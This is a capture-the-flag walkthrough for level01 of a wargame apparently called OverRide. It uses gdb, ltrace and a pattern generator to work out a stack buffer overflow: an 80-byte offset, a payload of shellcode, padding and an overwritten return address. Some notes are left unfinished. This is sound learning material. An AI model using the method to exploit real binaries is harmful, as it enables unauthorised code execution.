# Level 01

# Level 00

- Once logged in, you will see a binary.

```
[???]$ ssh 164.92.144.154 -p 4242 -l level01
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on 164.92.144.154:4242
level01@164.92.144.154's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
level01@OverRide:~$ ls
level01
level01@OverRide:~$
```

let's run the program
```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: admin
verifying username....

nope, incorrect username...

level01@OverRide:~$
```

we don't know the admin and how to program works, so let's take a look at the binary

```
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.

gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
[...]
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
[...]
gdb-peda$ info variables
[...]
0x0804a040  a_user_name
```

We see there are functions, and global variable declared.

by decompiling the source, we at least have an idea what the username and password is, `[dat_wil] and [admin]`

but regardless of giving input with 'correct' id and password..

```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...

level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
aaaaaaaaaaaaaaaa
nope, incorrect password...

level01@OverRide:~$
```

needs more xxxxxxxxxxxxxx

from using [Buffer overflow pattern generator
](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?), the offset is 80

As the program use fgets() function we should not be able to make a buffer overflow but fgets() take a max string of 100 chars wich is more than the size of our buffer (64). XXXXXXXXXXX

to create a payload, we first need to put username + '\n'.

Then, the offset (80 bytes) consist of shellcode and padding needs to be fedd, then the address needs to be provided.

from using `ltrace`, the address where password is stored can be easily found `=0xffffd69c`

```
level01@OverRide:~$ ltrace ./level01
__libc_start_main(0x80484d0, 1, -10364, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
) = 39
printf("Enter Username: ")                  = 16
fgets(Enter Username: dat_wil
"dat_wil\n", 256, 0xf7fcfac0)         = 0x0804a040
puts("verifying username....\n"verifying username....

)            = 24
puts("Enter Password: "Enter Password:
)                    = 17
fgets( <unfinished ...>
--- SIGWINCH (Window changed) ---
--- SIGWINCH (Window changed) ---
aaaaaaaaaaaaaaaaaaaaaaaa
<... fgets resumed> "aaaaaaaaaaaaaaaaaaaaaaaa\n", 100, 0xf7fcfac0) = 0xffffd69c
puts("nope, incorrect password...\n"nope, incorrect password...

)       = 29
+++ exited (status 1) +++
```

so the final payload will be below

```
[input for first]    [         shellcode + padding (within size of offset)           ] + [     address     ]
  dat_wil + '\n'  +    shellcode (28 bytes, or any) + random characters (80-28 = 52)   +  \x9c\xd6\xff\xff
```

